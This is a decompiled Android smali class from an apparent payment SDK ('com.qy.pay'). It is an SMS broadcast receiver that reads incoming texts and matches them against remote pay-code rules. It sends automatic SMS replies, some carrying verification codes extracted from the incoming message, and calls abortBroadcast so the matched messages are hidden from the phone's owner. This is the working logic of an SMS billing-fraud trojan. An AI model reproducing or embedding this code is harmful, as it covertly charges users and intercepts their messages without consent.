.class public Lcom/qy/pay/a/a;
.super Landroid/content/BroadcastReceiver;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private a(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 7

    invoke-static {}, Lcom/qy/pay/f/i;->a()Lcom/qy/pay/f/i;

    move-result-object v0

    iget-object v0, v0, Lcom/qy/pay/f/i;->h:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-nez v0, :cond_0

    :goto_1
    return-void

    :cond_0
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/qy/pay/network/b/f;

    :try_start_0
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "receiver payCodeInfo:"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Lcom/qy/pay/network/b/f;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/qy/pay/f/M;->b(Ljava/lang/String;)V

    invoke-virtual {v0}, Lcom/qy/pay/network/b/f;->d()Lcom/qy/pay/network/b/i;

    move-result-object v2

    if-eqz v2, :cond_5

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->c()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v3

    if-nez v3, :cond_5

    invoke-static {p1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v3

    if-nez v3, :cond_5

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->c()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_5

    invoke-virtual {v0}, Lcom/qy/pay/network/b/f;->i()B

    move-result v3

    const/4 v4, 0x1

    if-ne v3, v4, :cond_2

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->d()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->a()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-static {v3, v4, v5, v6}, Lcom/qy/pay/e/a;->a(Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    invoke-static {}, Lcom/qy/pay/f/i;->a()Lcom/qy/pay/f/i;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v3, v0, v4}, Lcom/qy/pay/f/i;->a(Lcom/qy/pay/network/b/f;Lcom/qy/pay/network/b/f;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "STATIC  sPhone:"

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->d()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, ",sendContent:"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/qy/pay/f/M;->b(Ljava/lang/String;)V

    :cond_1
    :goto_2
    invoke-virtual {p0}, Lcom/qy/pay/a/a;->abortBroadcast()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    invoke-static {v0}, Lcom/qy/pay/f/M;->a(Ljava/lang/Throwable;)V

    goto/16 :goto_0

    :cond_2
    :try_start_1
    invoke-virtual {v0}, Lcom/qy/pay/network/b/f;->i()B

    move-result v3

    const/4 v4, 0x2

    if-ne v3, v4, :cond_3

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->c()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v3}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v3

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->c()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v4

    add-int/2addr v3, v4

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->b()I

    move-result v4

    add-int/2addr v4, v3

    invoke-virtual {p1, v3, v4}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->d()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-static {v4, v3, v5, v6}, Lcom/qy/pay/e/a;->a(Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    invoke-static {}, Lcom/qy/pay/f/i;->a()Lcom/qy/pay/f/i;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v3, v0, v4}, Lcom/qy/pay/f/i;->a(Lcom/qy/pay/network/b/f;Lcom/qy/pay/network/b/f;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "DYNAMIC  sPhone:"

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->d()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, ",sendContent:"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/qy/pay/f/M;->b(Ljava/lang/String;)V

    goto :goto_2

    :cond_3
    invoke-virtual {v0}, Lcom/qy/pay/network/b/f;->i()B

    move-result v3

    const/4 v4, 0x3

    if-ne v3, v4, :cond_4

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->c()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v0

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->c()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v3

    add-int/2addr v0, v3

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->b()I

    move-result v3

    add-int/2addr v3, v0

    invoke-virtual {p1, v0, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    invoke-static {}, Lcom/qy/pay/f/i;->a()Lcom/qy/pay/f/i;

    move-result-object v3

    invoke-static {}, Lcom/qy/pay/f/i;->a()Lcom/qy/pay/f/i;

    move-result-object v4

    iget-object v4, v4, Lcom/qy/pay/f/i;->f:Lcom/qy/pay/network/b/f;

    invoke-virtual {v3, v4, v0}, Lcom/qy/pay/f/i;->a(Lcom/qy/pay/network/b/f;Ljava/lang/String;)V

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "receiver msg:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/qy/pay/f/M;->b(Ljava/lang/String;)V

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "WEB  sPhone:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->d()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ",sendContent:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ",sVerifyCode:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/qy/pay/f/M;->b(Ljava/lang/String;)V

    goto/16 :goto_2

    :cond_4
    invoke-virtual {v0}, Lcom/qy/pay/network/b/f;->i()B

    move-result v3

    const/4 v4, 0x4

    if-ne v3, v4, :cond_1

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->a()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-static {p2, v3, v4, v5}, Lcom/qy/pay/e/a;->a(Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    invoke-static {}, Lcom/qy/pay/f/i;->a()Lcom/qy/pay/f/i;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v3, v0, v4}, Lcom/qy/pay/f/i;->a(Lcom/qy/pay/network/b/f;Lcom/qy/pay/network/b/f;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v3, "STATIC_SELF Phone:"

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v3, ",sendContent:"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v2}, Lcom/qy/pay/network/b/i;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/qy/pay/f/M;->b(Ljava/lang/String;)V

    goto/16 :goto_2

    :cond_5
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "dealWithIntercept payCodeInfo:"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Lcom/qy/pay/network/b/f;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lcom/qy/pay/f/M;->b(Ljava/lang/String;)V

    invoke-direct {p0, p1, p2, v0}, Lcom/qy/pay/a/a;->a(Ljava/lang/String;Ljava/lang/String;Lcom/qy/pay/network/b/f;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0
.end method

.method private a(Ljava/lang/String;Ljava/lang/String;Lcom/qy/pay/network/b/f;)V
    .locals 3

    invoke-virtual {p3}, Lcom/qy/pay/network/b/f;->j()Ljava/util/ArrayList;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/qy/pay/network/b/b;

    invoke-virtual {v0}, Lcom/qy/pay/network/b/b;->b()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p2, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_1

    invoke-virtual {p0}, Lcom/qy/pay/a/a;->abortBroadcast()V

    :cond_1
    invoke-virtual {v0}, Lcom/qy/pay/network/b/b;->a()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-virtual {p0}, Lcom/qy/pay/a/a;->abortBroadcast()V

    :cond_2
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "Intercept phone:"

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "  msg:"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/qy/pay/f/M;->b(Ljava/lang/String;)V

    goto :goto_0
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 6

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    invoke-static {}, Lcom/qy/pay/c/a;->a()Lcom/qy/pay/c/a;

    move-result-object v1

    iget-object v1, v1, Lcom/qy/pay/c/a;->b:Ljava/lang/String;

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "SmsReceiver action is error"

    invoke-static {v0}, Lcom/qy/pay/f/M;->a(Ljava/lang/String;)V

    :goto_0
    return-void

    :cond_0
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    if-nez v0, :cond_1

    const-string v0, "SmsReceiver bundle is null"

    invoke-static {v0}, Lcom/qy/pay/f/M;->a(Ljava/lang/String;)V

    goto :goto_0

    :cond_1
    const-string v1, "pdus"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/Object;

    array-length v1, v0

    new-array v4, v1, [Landroid/telephony/SmsMessage;

    const-string v2, ""

    new-instance v5, Ljava/lang/StringBuffer;

    invoke-direct {v5}, Ljava/lang/StringBuffer;-><init>()V

    const/4 v1, 0x0

    move v3, v1

    :goto_1
    array-length v1, v0

    if-lt v3, v1, :cond_2

    invoke-virtual {v5}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0, v2, p1}, Lcom/qy/pay/a/a;->a(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    goto :goto_0

    :cond_2
    aget-object v1, v0, v3

    if-eqz v1, :cond_3

    aget-object v1, v0, v3

    check-cast v1, [B

    invoke-static {v1}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v1

    aput-object v1, v4, v3

    aget-object v1, v4, v3

    if-eqz v1, :cond_3

    aget-object v1, v4, v3

    invoke-virtual {v1}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v1

    aget-object v2, v4, v3

    invoke-virtual {v2}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v5, v2}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    :goto_2
    add-int/lit8 v2, v3, 0x1

    move v3, v2

    move-object v2, v1

    goto :goto_1

    :cond_3
    move-object v1, v2

    goto :goto_2
.end method
